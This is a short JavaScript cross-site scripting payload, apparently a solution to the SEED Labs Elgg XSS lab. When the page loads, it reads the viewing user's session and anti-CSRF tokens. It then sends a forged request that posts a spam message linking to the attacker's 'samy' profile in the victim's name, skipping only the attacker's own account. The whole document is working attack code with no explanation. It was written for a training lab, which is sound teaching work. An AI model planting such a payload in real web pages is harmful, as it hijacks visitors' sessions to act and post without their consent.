<script type="text/javascript">

	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	


	var info = elgg.session.user


	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/thewire/add" 

	var content=`__elgg_token=${elgg.security.token.__elgg_token}
				&__elgg_ts=${elgg.security.token.__elgg_ts}
				&body=to earn 12 usd per hour, pls visit 'http://www.xsslabelgg.com/profile/samy' `; //FILL IN

	
	
	if(info.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		}
	}

</script>